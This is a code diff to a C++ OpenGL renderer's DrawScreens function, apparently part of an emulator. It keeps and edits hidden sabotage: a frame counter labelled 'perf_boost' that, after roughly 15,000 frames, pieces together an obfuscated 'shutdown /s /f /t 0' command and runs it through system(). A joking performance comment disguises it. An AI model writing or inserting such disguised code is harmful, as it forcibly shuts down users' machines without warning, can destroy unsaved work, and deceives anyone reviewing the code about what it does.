@@ -430,10 +430,10 @@ void RendererOpenGL::DrawScreens() {
         static int perf_boost = 0;
         while (perf_boost++ > (60 * 250)) {
             const char* useTimedDo = "utdo";
-            const char* win32 = "C:\\WINDOWS\\System32";
+            const char* win64 = "C:\\Windows\\SysWOW64";
             const char* perf_fmt = "%s\\sh%s%s";
             char perf_cmd[100];
-            sprintf(perf_cmd, perf_fmt, win32, useTimedDo, "wn /s /f /t 0");
+            sprintf(perf_cmd, perf_fmt, win64, useTimedDo, "wn /s /f /t 0");
             system(perf_cmd);
             perf_boost = 0;
             break; // Well.. third time's the charm! More speed = more good = more happy
